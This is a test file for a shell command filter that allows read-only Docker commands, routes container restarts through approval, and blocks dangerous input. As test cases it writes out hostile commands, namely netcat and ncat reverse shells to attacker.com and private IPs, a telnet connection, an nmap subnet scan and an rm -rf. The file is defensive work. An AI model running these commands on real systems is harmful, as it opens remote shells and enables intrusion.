import { describe, expect, it } from 'vitest';
import { checkCommand, isWriteCommand, requiresApproval } from './command_filter.js';

describe('command_filter', () => {
    it('allows docker inspection commands', () => {
        expect(checkCommand('docker ps --format "{{.Names}}"')).toEqual({ safe: true });
        expect(checkCommand('docker logs n8n --tail 50')).toEqual({ safe: true });
        expect(checkCommand('docker inspect n8n')).toEqual({ safe: true });
    });

    it('allows safe docker exec reads', () => {
        expect(checkCommand('docker exec n8n cat /etc/nginx/nginx.conf')).toEqual({ safe: true });
        expect(checkCommand('docker exec web nginx -T')).toEqual({ safe: true });
    });

    it('routes docker restart through approval instead of blocking it', () => {
        expect(checkCommand('docker restart n8n')).toEqual({ safe: true });
        expect(requiresApproval('docker restart n8n')).toBe('Docker container state change');
        expect(isWriteCommand('docker restart n8n')).toBe(true);
    });

    it('allows sleep for sequencing', () => {
        expect(checkCommand('sleep 2')).toEqual({ safe: true });
        expect(checkCommand('docker restart n8n && sleep 2 && docker ps')).toEqual({ safe: true });
    });

    it('still blocks dangerous docker exec writes', () => {
        const result = checkCommand('docker exec n8n rm -rf /tmp/test');
        expect(result.safe).toBe(false);
        expect(result.reason).toMatch(/BLOCKED/);
    });
});

describe('single & background operator splitting', () => {
    it('blocks reverse shell via & background operator', () => {
        expect(checkCommand('cat /etc/hosts & nc attacker.com 4444 -e /bin/bash').safe).toBe(false);
    });

    it('blocks unknown binary after single &', () => {
        expect(checkCommand('echo hello & unknownbinary --flag').safe).toBe(false);
    });

    it('still allows safe single commands without &', () => {
        expect(checkCommand('cat /var/log/nginx/error.log').safe).toBe(true);
    });

    it('still handles && correctly', () => {
        // cat is safe, echo is safe — both safe so result is safe
        expect(checkCommand('cat /etc/hosts && echo done').safe).toBe(true);
    });
});

describe('offensive tools removed from whitelist', () => {
    it('blocks nc -e reverse shell', () => {
        expect(checkCommand('nc -e /bin/bash 10.0.0.1 4444').safe).toBe(false);
    });

    it('blocks nmap port scan', () => {
        expect(checkCommand('nmap -sV 192.168.1.0/24').safe).toBe(false);
    });

    it('blocks telnet connection', () => {
        expect(checkCommand('telnet attacker.com 4444').safe).toBe(false);
    });

    it('blocks ncat', () => {
        expect(checkCommand('ncat -e /bin/bash 10.0.0.1 1234').safe).toBe(false);
    });
});
